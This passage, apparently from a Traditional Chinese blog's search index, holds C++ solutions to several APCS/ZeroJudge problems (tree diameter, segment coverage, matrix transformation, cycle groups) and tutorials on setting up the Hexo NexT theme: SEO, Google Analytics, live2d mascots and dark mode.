4\n(4→1→0→3→6)。\n\n給予任一家族的關係圖，請找出最遠的” 血緣距離”。\n\n\n解題思路：\n這題是要求所謂的\n樹直徑（整個祖譜就可以看成是一顆樹，要求相距最遠就是樹直徑了）\n我做這題的方法是在 dfs 遍歷整棵樹的同時，紀錄從葉子到各子樹的最大節點數（也就是那個節點到子葉的層數，後面稱為 rank）以及各子樹的中最大直徑，同時取出各子樹中第一深跟第二深的為 max_rank、second_rank，如此目前節點的直徑就會是：\n\\[max(children\\_max\\_distance,\nmax\\_rank+second\\_rank+1)\\]\n（直觀想的話會以為該節點為根節點的樹直徑是第一深 + 第二深的層數 + 自己這個節點，但還要考慮到可能子樹中已經有更大直徑的狀況，還有只有一個節點、或本身就是葉子的狀況，但因為此時的 second_rank 或是 max_rank、second_rank 會是 0，因此同樣會是 max_rank + second_rank + 1）\n該節點的最大層數就會是子樹的最大層數 + 1 (而當本身是葉子時就是 1，但因為此時 max_rank 是 0，因此這個 special\ncase 寫的時候不用也不用特別限制)\n另外我為了實作方便，我把 max_distance 獨立成一個變數，不跟 dfs 的遞迴寫在一起，這樣寫起來也比較簡單\n其他更詳細的實作細節可以看底下程式碼的註解\n🌟 如果確定時間複雜度是 \\(O(n)\\)\n但還是 TLE 的話，有可能是你沒加上輸入輸出優化ios::sync_with_stdio(0);cin.tie(0); cout.tie(0);，但這題好像有點刁鑽，所以可能還需要再快一些才會過，像是我後來就發現不能夠 memset，因為不用每次都把整個陣列初始化，有要用到的再設回 0 就好了，另外也有人講到可以把 cin/cout 全部改成 printf/scanf 會更快，不過我是把 memset 改掉之後就成功 AC 了，或者你可以試試看多丟幾次，我丟上去 AC 的程式執行時間有差到快一秒的，可以多試幾次。\n\nAPCS 血緣關係#include &lt;bits/stdc++.h&gt;#define Max 100001using namespace std;vector&lt;int&gt; edge[Max];bool vis[Max];int max_dis=0;int dfs(int node){    //我定義的dis是節點個數，因此在最後輸出時需要-1    //小孩要回傳他到自己最深的層數，母親記錄子代最大血緣距離（小孩最大的前兩個相加）、自己到最深的距離(最深距離+1)    //並拿去跟max_dis取max，終端條件是沒有小孩的節點，回傳1    if(vis[node]) return 0;    vis[node]=1;    int child_max_rank=0, child_second_max_rank=0;    for(int child : edge[node]){        int rank=dfs(child);        if(rank&gt;child_max_rank) child_second_max_rank=child_max_rank,child_max_rank=rank;        else if(rank&gt;child_second_max_rank) child_second_max_rank=rank;    }    max_dis = max(max_dis,child_max_rank+child_second_max_rank+1);    // cout &lt;&lt; node &lt;&lt; ' '&lt;&lt; child_max_rank &lt;&lt; ' ' &lt;&lt; child_second_max_rank &lt;&lt; ' ' &lt;&lt; max_dis &lt;&lt; '\\n';    return child_max_rank+1; //加上自己到子代的那層}signed main(){    ios::sync_with_stdio(0);    cin.tie(0); cout.tie(0);    int n;    while(cin &gt;&gt; n){        max_dis=0;        for(int i=0; i&lt;n; i++) edge[i].clear(), vis[i]=0; //因為節點事是0~n所以是&lt;n而不是&lt;n-1        // memset(vis, 0, sizeof(vis)); 這裡用memset會TLE，應該就是說不用每次都把100001個都改掉        for(int i=0, tmp1, tmp2; i&lt;n-1; i++)            cin&gt;&gt;tmp1&gt;&gt;tmp2, edge[tmp1].push_back(tmp2), edge[tmp2].push_back(tmp1);            //雖然題目聽起來是有向圖，但為了後續dfs遍歷整棵樹，這邊就用無向圖紀錄，之後再定向即可        dfs(0);        cout &lt;&lt; max_dis-1 &lt;&lt; '\\n';    }    return 0;}\n\n\n AC 的 Submission～\n\n","categories":["程式題解","APCS"],"tags":["APCS","樹直徑"]},{"title":"APCS 線段覆蓋長度 (zerojudge b966 / f855)","url":"/zerojudge_b966_f855/","content":"題目網址 (測資加強版)\n給定一維座標上一些線段，求這些線段所覆蓋的長度，注意，重疊的部分只能算一次。\n例如給定 4 個線段 (5, 6)、(1, 2)、(4, 8)、(7,\n9)，如下圖，線段覆蓋長度為 6 (包含 1～2、4～9)。\n\n\n\n解題思路：\n如果直接開個陣列記錄每格格子走過了沒，最後再去檢查，但時間複雜度會是 \\(O(NL)\\) 會到 10^11 次方 (L 代表座標範圍)，肯定會 TLE，改成用 priority\nqueue（Heap）去存輸入，讓左界是由小到大排列（或者一開始用陣列儲存之後再 sort，時間複雜度一樣不變是\n\\(O(N log N)\\)\n），並紀錄目前右界最大值，就可以確定後續資料的左界不會比前面的小，並用 result 紀錄目前覆蓋的格子數，這樣只要判斷以下兩種狀況\n\n輸入的左界目前右界最大值還大：將 result 加上整段區間長度，並更新右界最大值為輸入的右界\n輸入的左界目前右界最大值小且輸入的右界也比前右界最大值大：將 result 加上輸入右界到目前最大值的範圍，並更新右界最大值為輸入的右界\n（若輸入的左界目前右界最大值小且輸入的右界也比前右界最大值小，則目前這個區間都在目前已涵蓋的格子內）\n\n而如此一來就可以讓時間複雜度小至 \\(O(N log\nN)\\)，能夠在題目給定時間內完成\n🌟 可以搭配 pair 使用會比較方便\n\nAPCS 線段覆蓋長度#include &lt;bits/stdc++.h&gt;#define pii pair&lt;int, int&gt;#define l first#define r secondusing namespace std;priority_queue&lt;pii, vector&lt;pii&gt;, greater&lt;pii&gt; &gt; pq;int n;signed main(){    ios::sync_with_stdio(0);    cin.tie(0);    cin&gt;&gt; n;    for(int i = 0, tmp1, tmp2; i&lt;n; i++)        cin &gt;&gt; tmp1 &gt;&gt; tmp2, pq.push(make_pair(tmp1, tmp2));    int max=pq.top().l, result=0;    while(!pq.empty()) {        pii cur = pq.top();        pq.pop();        if(cur.r&lt;=max) continue;        else if(cur.first&lt;=max) result+=cur.r-max, max=cur.r;        else result+=(cur.r-cur.l), max=cur.r;    }    cout &lt;&lt; result &lt;&lt; '\\n';        return 0;}\n\n\n","categories":["程式題解","APCS"],"tags":["APCS"]},{"title":"APCS 2017-0304-1 秘密差 (zerojudge c290)","url":"/zerojudge_c290/","content":"題目網址\n將一個十進位正整數的奇數位數的和稱為 A\n，偶數位數的和稱為 B，則 A 與 B 的絕對差值 |A －B|\n稱為這個正整數的秘密差。\n例如： 263541 的秘密差是 |(6 + 5+1) － (2 + 3+4)|= 3 。\n給定一個 十進位正整數 X，請找出 X 的秘密差。\n\n\n解題思路：\n就直接做，不用什麼特別的技巧\n🌟用 string 讀輸入，方便讀取奇位數跟偶位數的值\n\nAPCS 2017-0304-1 秘密差#include &lt;bits/stdc++.h&gt;using namespace std;int main(){    ios::sync_with_stdio(0);    cin.tie(0);    string input;    cin &gt;&gt; input;    int odd = 0, even = 0;    for(int i = 0; input[i]; i++){        if(i%2) even += input[i]-'0';        else odd += input[i]-'0';    }    cout &lt;&lt; abs(odd-even) &lt;&lt; '\\n';    return 0;}\n\n\n AC 的 Submission～\n\n","categories":["程式題解","APCS"],"tags":["APCS"]},{"title":"APCS 矩陣轉換 (zerojudge b266 / b965)","url":"/zerojudge_b266_b965/","content":"題目網址 (多筆測資版 (https://zerojudge.tw/ShowProblem?problemid = b965))\n矩陣是將一群元素整齊的排列成一個矩形，在矩陣中的橫排稱為列 (row)\n，直排稱為行 (column) ，其中以 Xij 來表示 矩陣 X 中的第 i 列第 j\n行的元素。\n我們可以對矩陣定義兩種操作如下：\n　　翻轉：即第一列與最後一列交換、第二列與倒數第二列交換、…\n依此類推。\n　　旋轉：將矩陣以順時針方向轉 90 度。\n一個 矩陣 A 可以經過一連串的旋轉與翻轉操作後，轉換成 新矩陣 B 。\n給定 矩陣 B 和一連串的操作，請算出原始的 矩陣 A 。\n\n\n解題思路：\n這題題目測資範圍 R,C,M 都小於 10，如果直接做的話複雜度應該就是 O (RCM)（就是按照題目的意思把輸入的矩陣反著操作），限制 2s 應該是可以順利通關\n🌟因為是要從 B 推回原先的矩陣，因此需要將輸入指令倒著走一次（例如原本是 A 矩陣翻轉、翻轉、順時針旋轉 90 度得到 B 矩陣，就要將 B 矩陣逆時針旋轉 90 度、翻轉、翻轉，才能變成原先的 A 矩陣），因此現在問題就只剩下如何完成翻轉和逆時針旋轉 90 度了\n\n翻轉：這邊是指上下翻轉，因此較為簡單，只要將第 i 列第 j 行的元素跟第 (c-i) 列第 j 行的元素交換即可，且其中 i 跟 (c-i) 會在一半的地方交會，且在 c 是奇數時 (c + 1)/2 的那行可以不做任何操作，因此讓 i 從 0~c/2 執行過一次即可\n逆時針旋轉 90 度：這個稍微難一點，可以想做事將左上角固定，逆時針旋轉 90 度，如此一來可以發現就是將 (i,j) 位置的元素移動到 (r-j-1,i)\n\n\n✏️多筆測資就只要把一開始的輸入包在 while 裡就好了\n\nb965. 第 2 題 矩陣轉換#include &lt;bits/stdc++.h&gt;using namespace std;int arr[11][11];int c,r,m;void turn(){    int tmp[11][11];    for(int i = 0; i&lt;c; i++)        for(int j = r-1; j&gt;=0; j--)            tmp[r-1-j][i]=arr[i][j];    swap(c,r);    for(int i = 0; i&lt; c; i++)        for(int j = 0; j&lt;r; j++)            arr[i][j] = tmp[i][j];}void reverse(){    for(int i = 0; i&lt;c/2; i++)        for(int j = 0; j&lt;r; j++)            swap(arr[i][j], arr[c-1-i][j]);}signed main(){    ios::sync_with_stdio(0);    cin.tie(0);    while(cin &gt;&gt; c &gt;&gt; r &gt;&gt; m){        for(int i = 0; i&lt; c; i++)            for(int j = 0; j&lt;r; j++)                cin &gt;&gt; arr[i][j];        bool cmd[11];        for(int i = 0; i&lt;m; i++) cin &gt;&gt; cmd[i];        for(int i = m-1; i&gt;=0; i--){            if(cmd[i]) reverse();            else turn();        }        cout &lt;&lt; c &lt;&lt; ' ' &lt;&lt; r &lt;&lt; '\\n';        for(int i = 0; i&lt; c; i++){            for(int j = 0; j&lt;r; j++){                cout &lt;&lt; arr[i][j];                if(j&lt;r-1) cout &lt;&lt; ' ';            }            cout &lt;&lt; '\\n';        }    }    return 0;}\n\n\n AC 的 Submission～\n\n","categories":["程式題解","APCS"],"tags":["APCS"]},{"title":"APCS 2017-0304-2 小群體 (zerojudge c291)","url":"/zerojudge_c291/","content":"題目網址\nQ 同學正在習程式， P 老師出了以下的題目讓他練習。\n一群人在一起時經常會形成一個一個的小群體。假設有 N 個人，編號由 0 到\nN-1，每個人都寫下他最好朋友的編號（最好朋友有可能是他自己的編號，如果他自己沒有其他好友），\n在本題中，每個人的好友編號絕對不會重複，也就是說 0 到 N-1 每個數字\n都恰好出現一次。\n本題的問題是：按照順序輸入每個人好友編號，計算出總共有幾小群體。\n\n\n解題思路：\n這題剛看完之後一開始想到用併查集 (Disjoint-set)，後來發現我想太多，我後來用 dfs 遍歷看會不會重複拜訪到就完成了。\n🌟可以看成是好幾顆聯通的節點，題目問的就是看說總共有幾群節點，因為有規定數字不會重複，所以當出現環（子孫接回祖先的時候），就代表這個群體結束了\n\nAPCS 2017-0304-2 小群體#include &lt;bits/stdc++.h&gt;#define Max 50005using namespace std;bool vis[Max];int people[Max];int group = 0;void dfs(int i){    if(vis[i]) return;    vis[i] = true;    if(vis[people[i]])        group++;    dfs(people[i]);}signed main(){    ios::sync_with_stdio(0);    cin.tie(0);    memset(vis,0, sizeof(vis));    int n;    cin &gt;&gt; n;    for(int i = 0; i&lt; n; i++) cin &gt;&gt; people[i];    for(int i = 0; i&lt; n; i++) dfs(people[i]);    cout &lt;&lt; group &lt;&lt; '\\n';    return 0;}\n\n\n AC 的 Submission～\n\n","categories":["程式題解","APCS"],"tags":["APCS"]},{"title":"Hexo-NexT 一些好用的酷東東","url":"/NexT-some-cool-tools/","content":"前言 \n在這篇中所講述的是一些可以沒有，但是有的話可能會很方便的酷東東\n\nvscode-imgur \n\n\n就是要申請 API 讓 vscode 使用，詳細教學可以看這邊\n閱讀更多按鈕 \n如果沒有這個的話在一開始首頁的地方全部文章都會是展開的，這樣對於要翻看有哪些內容就很不方便，網站整體觀感也會不好，因此可以新增一個閱讀更多的按鈕，設定每篇文章要顯示多少內容給使用者看，這個部分我有在 SEO 優化的 description 中說明\n標題前的圖示 \n這個有一個比較簡單的方法，在theme/NexT(改成你的主題名稱)/source/css/main.styl，貼上以下程式碼，裡面的符號可以改成自己的\n/*修改h2前面圖標*/.posts-expand .post-body h2:before{    content: \"🔍\";    margin-right: 16px;}/*修改h3前面圖標*/.posts-expand .post-body h3:before{    content: \"📌\";    margin-right: 16px;}\n另外一個方法就是到最外層資料夾中的source新建一個_data的資料夾，然後在裡面新增styles.styl這個檔案（也就是source/data/styles.styl，然後將剛剛上面的程式碼貼在裡面，最後到theme/NexT(改成你的主題名稱)/_config.yml將 custom_file_path 的最後一項style: source/_data/styles.styl的註解取消，就完成了\n\n\n開啟 custom_file_path 設定\n\nMathJax \n這個部分篇幅比較長一點，所以我單獨又寫了一篇講解，效果就是像下面那樣，可以插入各種算式，甚至化學式也可以\n\\[\nA = \\begin{bmatrix}\n        a_{11}    &amp; a_{12}    &amp; ...    &amp; a_{1n}\\\\\n        a_{21}    &amp; a_{22}    &amp; ...    &amp; a_{2n}\\\\\n        a_{31}    &amp; a_{22}    &amp; ...    &amp; a_{3n}\\\\\n        \\vdots    &amp; \\vdots    &amp; \\ddots &amp; \\vdots\\\\\n        a_{n1}    &amp; a_{n2}    &amp; ... &amp; a_{nn}\\\\\n    \\end{bmatrix} , b = \\begin{bmatrix}\n        b_{1}  \\\\\n        b_{2}  \\\\\n        b_{3}  \\\\\n        \\vdots \\\\\n        b_{n}  \\\\\n    \\end{bmatrix}\n\\]\n\\[\n\\begin{aligned}\na &amp;= b + c \\\\  \n  &amp;= d + e + f + g \\\\  \n  &amp;= h + i\n\\end{aligned}\n\\]\n\\[\ne=mc^2\n\\]\n\\[\nC_p[\\ce{H2O(l)}] = \\pu{75.3 J // mol K}\n\\]\n文章編輯按鈕 \n\n\nTravis Ci 自動部署 \n搭配上一項編輯按鈕食用，這邊先看前輩寫的文章，之後有時間我在重新寫一篇\nnpm 套件自動更新 \n不知道你有沒有在生成網頁的時候出現 npm 套件的問題 (可能就是在執行hexo clean\nhexo g hexo d\nhexo s時)，如下圖，在經過多次測試之後發現大部分都是因為版本有問題，後來我發現了一個檢查套件版本的工具，自動檢查哪些版本過舊並升級，大多數狀況在升級後就沒事了\n\nHexo PDF 預覽 \n可以在網頁裡展示 PDF，hexo-pdf\n記得要把主題內的 pdf 設成true\n\n然後如果想讓每個頁面出現的 pdf 不一樣大可以用以下程式碼\n&lt;embed src=\"ooxx.pdf\" width=100% height=\"自己設\" type=\"application/pdf\"&gt;\nNexT Group Picture \n使用指令\n{% gp [number]-[layout] %}{% endgp %}\n\n\n繪製圖表 \n教學在這邊\n可以畫出像下面各種的表格\ngantt\ndateFormat  YYYY-MM-DD\nsection Section\nCompleted :done,    des1, 2014-01-06,2014-01-08\nActive        :active,  des2, 2014-01-07, 3d\nParallel 1   :         des3, after des1, 1d\nParallel 2   :         des4, after des1, 1d\nParallel 3   :         des5, after des3, 1d\nParallel 4   :         des6, after des4, 1d\nclassDiagram\nClass01 &lt;|-- AveryLongClass : Cool\n&lt;&lt;interface&gt;&gt; Class01\nClass09 --&gt; C2 : Where am i?\nClass09 --* C3\nClass09 --|&gt; Class07\nClass07 : equals()\nClass07 : Object[] elementData\nClass01 : size()\nClass01 : int chimp\nClass01 : int gorilla\nclass Class10 {\n  &lt;&lt;service&gt;&gt;\n  int id\n  size()\n}\npie\n\"Dogs\" : 386\n\"Cats\" : 85\n\"Rats\" : 15\n或是可以畫時序圖（wavedrom）\n\n{ signal: [\n  { name: \"clk\",         wave: \"p.....|...\" },\n  { name: \"Data\",        wave: \"x.345x|=.x\", data: [\"head\", \"body\", \"tail\", \"data\"] },\n  { name: \"Request\",     wave: \"0.1..0|1.0\" },\n  {},\n  { name: \"Acknowledge\", wave: \"1.....|01.\" }\n]}\n\n\n{ signal: [\n  { name: 'A', wave: '01........0....',  node: '.a........j' },\n  { name: 'B', wave: '0.1.......0.1..',  node: '..b.......i' },\n  { name: 'C', wave: '0..1....0...1..',  node: '...c....h..' },\n  { name: 'D', wave: '0...1..0.....1.',  node: '....d..g...' },\n  { name: 'E', wave: '0....10.......1',  node: '.....ef....' }\n  ],\n  edge: [\n    'a~b t1', 'c-~a t2', 'c-~>d time 3', 'd~-e',\n    'e~>f', 'f->g', 'g-~>h', 'h~>i some text', 'h~->j'\n  ],\n  config:{skin:'lowkey'}\n}\n\n結語 \n這些酷酷的工具是不是也挺方便的呢？如果有問題或者發現我還有什麼酷酷的功能沒有講到，歡迎大家到底下留言區跟我討論喔～\n其他功能 \n\n側邊欄\n－ 基礎配置 (關於、標籤、分類、歸檔、搜尋、頭像、個人相關連結)\n－ 切換語言\n頁底\nutterances 留言板\nGoogle\nAnalytics 統計網站資訊\n日 / 夜模式\nlive2d 角色（就是網頁右下角那隻可愛的狗狗）\nSEO：搜尋引擎最佳化 (Search Engine\nOptimization)\n 剩下的一些小工具 ✅\n自訂網域\n\n","categories":["教學文"],"tags":["Hexo","NexT"]},{"title":"SEO 配置 (搜尋引擎最佳化)","url":"/SEO-Search-Engine-Optimization/","content":"前言 \n什麼是 SEO 呢？\n&gt; 搜尋引擎最佳化（英語：search engine\noptimization，縮寫為 SEO）是透過了解搜尋引擎的運作規則來調整網站，以及提高目的網站在有關搜尋引擎內排名的方式。(摘自維基百科)\nSEO 優化就是讓搜尋引擎更喜歡你的網站，讓你的網站可以讓更多人看到的過程，接下來我會先從怎麼知道目前網頁的 SEO 狀況，再一一列舉優化的方法，如果只是想要知道如何能在 google 上搜尋到自己網頁的人可以直接看最後一項google\nsearch console 的使用方式。\n\n\n網頁目前 SEO 狀況\n網頁優化方法\n2.1. 網址\n2.2. 新增 description\n2.3. Nofollow\n2.4. sitemap\n2.5. robots.txt\n2.6. Google\nSearch Console\n\n網頁目前 SEO 狀況 \n要優化前當然要先看看自己的目前的狀況，可以到PageSpeed\nInsights，輸入自己的網頁的網址，就可以知道目前自己網頁的狀況\n\n另外可以搜尋site:網域，看看自己的網站是否有被收錄到 google 內，如果還沒做過優化之前應該是什麼都沒有的，那在經過以下的操作後，可以確認你的網頁最少最少可以被搜尋到，如果你的網頁名稱不要太普遍，基本上要出現在第一頁應該不是問題\n\n網頁優化方法 \n網址 \n搜尋引擎不喜歡過長或是索引過多的網址 (例如說https://example.com/abc/def/ghi/jkl/mn)，因此建議把網址設定成你的檔案名稱（但就是要注意檔案名稱不能是中文，不然會變成亂碼），而且盡量跟文章要有關係，像是我這篇文章的檔案名稱就是success@SEO-Search-Engine-Optimization.md，如果覺得這樣太麻煩的話可以使用abbrlink 插件\n\n新增 description \n添加 description 可以讓使用者更快速了解你的文章在講什麼，所以對 SEO 也是很重要的部分，而我們需要分別在首頁和文章都個別設定相關的描述\n首頁\n到最外層的_config.yml去修改 description\n\n文章\n要新增文章的 description 有兩中方法，一個是在文章最上端的細節設定新增description: 你的description，但我覺得略顯麻煩，因為我的文章幾乎都有一個前言，因此我就想說直接將前言當作 description，作法很簡單，在前言的底下新增一行&lt;!--more--&gt;，就完成了\n\n另外補充，可以在主題內的_config.yml，將read_more_btn設定為true，如此一來在瀏覽你的網站時，就只會將文章中 description 的部分呈現出來，讓可讀性更高\n\n\nNofollow \n關於 nofollow 是什麼詳細可以看這篇文章，總之就是避免你的搜尋引擎權重值被別人分走，使用的是這個插件，如果沒有要設定什麼特別的東西的話，直接執行npm install hexo-filter-nofollow，就完成了\nsitemap \nsitemap 就是用來告訴搜尋引擎我這個網站有哪些網頁，方便搜尋引擎索引，要使用的插件是這個，執行npm install hexo-generator-sitemap下載插件\n接著到最外層的_config.yml，添加以下程式碼就完成了\nsitemap:  path: sitemap.xml\n可以試試看你的網址/sitemap.xml（如果是在本機跑的話應該就是localhost:4000/sitemap.xml，有沒有出現東西，有的話就是成功了\nrobots.txt \n到最外層資料夾中的source新增一個檔案robots.txt\n\n接下來再robots.txt內貼上以下內容，記得 Sitemap 後面要改成你自己的網址\nrobots.txtUser-agent: *Allow: /Allow: /archives/Allow: /categories/Allow: /tags/ Disallow: /vendors/Disallow: /fonts/Disallow: /fancybox/Sitemap: https://你的網址/sitemap.xml\nUser-agent\n是代表要讓哪些搜尋引擎抓取你的網頁，*就是全部都可以\nAllow\n這裡是代表允許搜尋引擎抓取網頁的哪些部分，照理來說如果有Allow: /就代表全部都可以，後面那些都是保平安用的（xd\nDisallow\n這裡就是避免搜尋引擎抓到你的字體、程式之類的\nSitemap 就是上面講到的 sitemap.xml\nGoogle Search Console \n這個是最重要的一步，前面那些事讓你的 SEO 更好，但如果沒有這個你的網頁大概根本搜尋不到，進入Google Search\nConsole，新增資源\n\n如果是使用 github\npage 的就只能用右邊的那個，他會叫你把一個 html 檔放到你的網頁中，你就將它下載，然後儲存到themes/NexT(或你用其他主題)/source，重新部署之後稍等一下應該就完成了\n如果是有自己網域的話，建議使用左邊的，這樣它涵蓋的範圍會比較廣，將它提供的 TXT 紀錄複製下來，然後添加網域的 DNS 設定，我這裡是用 namecheap，各家的使用方式也都大同小異，新增TXT Record，Host設定@，Value設定剛剛複製的 TXT 紀錄，幾分鐘後就會通過驗證了\n\n進入你的資源後裡面有很多資訊可以查詢，以下列出三點我認為較重要的說明\n搜尋網頁索引狀態\n可以透過上面的搜尋看自己網頁的索引狀態，如果發現沒有建立索引可以點擊要求建立索引，加速建立索引的時間，讓搜尋可以在更短的時間內將它放在搜尋的頁面上\n\n檢查網頁索引狀態\n這個頁面可以很快看到哪些頁面已經被搜尋引擎找到，哪些已經建立索引，搭配剛剛上面的搜尋就可以迅速知道目前各個網頁的狀態\n\n新增 Sitemap\n在這個頁面就是用來把之前生成的 Sitemap 交給 google 看，讓他更清楚你的網頁們\n\n結語 \n恭喜你的網頁現在已經可以在 google 上被查詢上了，可以在使用PageSpeed\nInsights 看看 SEO 的分數有沒有上升，也可以看他說你哪個地方不足去修正，分數應該就可以拿到幾乎 100 的分數了，如果有問題或者發現我有哪裡講錯，歡迎大家到底下留言區跟我討論喔～\n其他功能 \n\n側邊欄\n－ 基礎配置 (關於、標籤、分類、歸檔、搜尋、頭像、個人相關連結)\n－ 切換語言\n頁底\nutterances 留言板\nGoogle\nAnalytics 統計網站資訊\n日 / 夜模式\nlive2d 角色（就是網頁右下角那隻可愛的狗狗）\nSEO：搜尋引擎最佳化 (Search Engine Optimization) ✅\n剩下的一些小工具\n自訂網域\n\n","categories":["教學文"],"tags":["Hexo","NexT"]},{"title":"Hexo-NexT live 2d 配置","url":"/NexT-live2d/","content":"前言 \n這次要做的就是網頁右下角那隻可愛的狗狗，可以幫你看家招攬客人，還可以跟他一起玩，可說是一舉數得\n\n\n\n安裝 live 2d\n安裝 live\n2d 人物模型\n\n安裝 live 2d \n這次用的是這個模組，執行下方指令就可以安裝了\nnpm install --save hexo-helper-live2d\n接著在最外層的_config.yml 中加入以下程式碼（這個模組的作者是說放在 theme 裡面的_config.yml 也可以，不過我試過之後是沒辦法）\nlive2d:  enable: true  scriptFrom: local  pluginRootPath: live2dw/  pluginJsPath: lib/  pluginModelPath: assets/  tagMode: false  log: false  model:    use: live2d-widget-model-wanko  display:    position: right    width: 150    height: 300  mobile:    show: true  react:    opacity: 0.7\n安裝 live 2d 人物模型 \n到了這裡應該已經有狗狗出現在你的網頁上面了，不過還有很多模型可以選擇，像是貓咪或是可愛的小女孩，可以從這裡看到所有模型的預覽，不過我試過好以個之後還是覺得狗狗好可愛，或是也可以像我一樣中文的版面放狗，英文的版面放貓。\n\n\n那選好了想要的模型就可以來下載了，下面是所有模型的名稱，只要輸入npm install 模型名稱就可以下載了，例如我上面的貓咪就是npm install live2d-widget-model-tororo，如果是 live2d-widget-model-haru/01 或 live2d-widget-model-haru/02 的話就統一用npm install live2d-widget-model-haru\n模型名稱live2d-widget-model-chitoselive2d-widget-model-epsilon2_1live2d-widget-model-gflive2d-widget-model-haru/01live2d-widget-model-haru/02live2d-widget-model-harutolive2d-widget-model-hibikilive2d-widget-model-hijikilive2d-widget-model-izumilive2d-widget-model-koharulive2d-widget-model-mikulive2d-widget-model-ni-jlive2d-widget-model-nicolive2d-widget-model-nietzschelive2d-widget-model-nipsilonlive2d-widget-model-nitolive2d-widget-model-shizukulive2d-widget-model-tororolive2d-widget-model-tsumikilive2d-widget-model-unitychanlive2d-widget-model-wankolive2d-widget-model-z16\n安裝好後，到最外層的_config.yml 修改剛剛加入的程式碼，將下載好的模型名稱打在 model 的 use 後\n修改 model 中的 uselive2d:  enable: true  scriptFrom: local  pluginRootPath: live2dw/  pluginJsPath: lib/  pluginModelPath: assets/  tagMode: false  log: false  model:    use: 下載的模型名稱  display:    position: right    width: 150    height: 300  mobile:    show: true  react:    opacity: 0.7\n修改後應該就可以看到選的 live 2d 角色出現在你的網頁上面了\n結語 \n多了個守護神在你的網站上了，真的超酷的，如果有發現問題或者我有哪裡講錯，歡迎大家到底下留言區跟我討論喔～\n其他功能 \n\n側邊欄\n－ 基礎配置 (關於、標籤、分類、歸檔、搜尋、頭像、個人相關連結)\n－ 切換語言\n頁底\nutterances 留言板\nGoogle\nAnalytics 統計網站資訊\n日 / 夜模式\n live2d 角色（就是網頁右下角那隻可愛的狗狗）✅\nSEO：搜尋引擎最佳化 (Search Engine\nOptimization)\n剩下的一些小工具\n自訂網域\n\n","categories":["教學文"],"tags":["Hexo","NexT"]},{"title":"如何在 Hexo-NexT 主題中配置 Google Analytics","url":"/NexT-google-analytics/","content":"前言 \nGoogle\nAnalytics（後文簡稱為 GA）是一個由 Google 所提供的網站流量統計服務，透過在網站中埋入 GA 追蹤碼，網站主們可以獲取進站流量的資料，包括來源、使用者、裝置、造訪路徑等，透過 GA，可以更全面的了解品牌的受眾，進而為潛在客戶優化購買、造訪流程，提高轉單意願，對於網頁入門來說是非常推薦使用的工具。(摘自維基百科)\n\n不過這篇只會教你怎麼讓你的網頁與 GA 連結，詳細的操作可以看 google 推出的免費課程\n教學開始！ \n首先到GA 的官網註冊一個帳號，接著到管理建立帳戶、資源、最後切換到資料串流\n\n新增串流，選擇網頁\n\n設定串流名稱、串流網址，他會自動生成 GA\nid（就是最後的評估 id），把他複製下來等等會用到\n\n這次不去改_congif.yml 的內容，雖然說他裡面也有可以設定 GA 的地方，但不知道為什麼我試過之後沒辦法使用，這裡我們直接改他的 layout，首先到 theme-&gt;{your-theme-name}-&gt;layout-&gt;_layout.njk\n\n在 body 的上方插入以下程式碼，請務必將 ‘your-id’ 替換為剛剛複製的 id\n&lt;!-- Google tag (gtag.js) --&gt;&lt;script async src=\"https://www.googletagmanager.com/gtag/js?id=your-id\"&gt;&lt;/script&gt;&lt;script&gt;  window.dataLayer = window.dataLayer || [];  function gtag(){dataLayer.push(arguments);}  gtag('js', new Date());  gtag('config', 'your-id');&lt;/script&gt;\n\n\n將程式碼插入到 body 的上方\n\n重啟網站（使用hexo s）並重新載入網頁，然後前往 GA -&gt;\n報表 -&gt;\n即時，檢查是否有變化，有時可能需要等待一段時間才能看到數據更新。\n\n結語 \n現在，你可以使用 Google\nAnalytics 來監控每日訪問你的網站的人數。如果流量足夠，你甚至可以考慮進行廣告投放。如果有問題或者發現我有哪裡講錯，歡迎大家到底下留言區跟我討論喔～\n其他功能 \n\n側邊欄\n－ 基礎配置 (關於、標籤、分類、歸檔、搜尋、頭像、個人相關連結)\n－ 切換語言\n頁底\nutterances 留言板\n Google Analytics 統計網站資訊 ✅\n日 / 夜模式\nlive2d 角色（就是網頁右下角那隻可愛的狗狗）\nSEO：搜尋引擎最佳化 (Search Engine\nOptimization)\n剩下的一些小工具\n自訂網域\n\n","categories":["教學文"],"tags":["Hexo","NexT"]},{"title":"Hexo-NexT 深淺主題切換配置","url":"/NexT-dark-light-mode/","content":"前言 \n現在不論是手機應用程式、網頁幾乎都有所謂深淺模式，先不論省不省電或是好不好看，有了切換的功能就是很酷，使用者可以依自己喜好挑選自己習慣的模式，這篇內容因為有點太簡單，所以我就只有一個章節了～\n\n教學開始～ \n這次用的套件是這個，安裝的方式非常簡單，輸入下列指令就完成了\nnpm install hexo-next-darkmode\n設置的方式則是到 theme 內的_config.yml，貼上以下指令就完成了\n# Darkmode JS# For more information: https://github.com/rqh656418510/hexo-next-darkmode, https://github.com/sandoche/Darkmode.jsdarkmode_js:  enable: true  bottom: '64px' # 距離底端的距離  right: 'unset' # 距離右邊的距離(unset就是只需要設定左邊，右邊會自己調整)  left: '32px' # 距離左邊的距離(unset就是只需要設定右邊，左邊會自己調整)  time: '0.5s' # 切換深淺模式的時間  mixColor: 'transparent' # 這個建議不要用，雖然會出現酷酷的一個往外擴散的效果，可是他的顏色會跟原本的背景混再一起，有時候還會讓字不清楚，想玩的可以自己改改看  backgroundColor: 'transparent' #背景顏色  buttonColorDark: '#100f2c' # 在淺色模式的時候按鈕的顏色  buttonColorLight: '#fff' # 在深色模式的時候按鈕的顏色  isActivated: false # 這裡如果用true的話是可以自己改寫他的CSS，但我覺得應該沒有必要，詳細可以看github的內的介紹  saveInCookies: true # 會儲存到Cookies內，下次來會依照上次你的設定切換到深淺模式  label: '🌓' # 可以改成自己像要的表情圖示  autoMatchOsTheme: true # 自動切換到跟使用者裝置相同的深淺模式  libUrl: # Set custom library cdn url for Darkmode.js\n如果想要設定固定的背景或按鈕顏色的話可以修改 backgroundColor、buttonColorDark、buttonColorLight 後的色碼，例如說backgroundColor: \"#FFD9E6\"，推薦給有少女心的各位\n\n\n猛男粉紅💪\n\n結語 \n完成啦！深淺切換的功能很簡單吧～如果有問題或者發現我有哪裡講錯，歡迎大家到底下留言區跟我討論喔～\n其他功能 \n\n側邊欄\n－ 基礎配置 (關於、標籤、分類、歸檔、搜尋、頭像、個人相關連結)\n－ 切換語言\n頁底\nutterances 留言板\nGoogle\nAnalytics 統計網站資訊\n日 / 夜模式 ✅\nlive2d 角色（就是網頁右下角那隻可愛的狗狗）\nSEO：搜尋引擎最佳化 (Search 